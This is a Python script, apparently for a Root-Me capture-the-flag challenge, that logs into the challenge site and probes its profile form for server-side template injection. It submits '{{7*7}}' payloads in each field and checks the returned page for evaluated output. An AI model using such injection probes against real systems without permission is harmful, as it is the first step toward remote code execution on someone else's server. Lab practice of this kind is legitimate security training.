import requests, re
U="https://instance-019fe9e3-a6de-72c7-9cf7-76c651bf1127.challenges.root-me.pro"
s=requests.Session()
def tok(p):
    r=s.get(U+p); m=re.search(r'name="csrf_token"[^>]*value="([^"]+)"',r.text); return m.group(1) if m else None
s.post(U+"/login",data={"csrf_token":tok("/login"),"username":"pauk01","password":"Passw0rd!23","submit":"Sign In"})
d={"csrf_token":tok("/profile/pauk01"),
   "full_name":"AAA{{7*7}}AAA","age":"30","gender":"Male",
   "location":"BBB{{7*7}}BBB","bio":"CCC{{7*7}}CCC padding text here","interests":"DDD{{7*7}}DDD"}
r=s.post(U+"/profile/pauk01",data=d)
errs=re.findall(r'class="[^"]*(?:invalid-feedback|alert)[^"]*"[^>]*>\s*([^<]{1,120})',r.text)
print("errors:",errs)
r=s.get(U+"/profile/pauk01"); open("profile_probe.html","w").write(r.text)
for tag in ["AAA","BBB","CCC","DDD"]:
    print(tag,"->",re.findall(tag+r'.{0,15}',r.text)[:3])
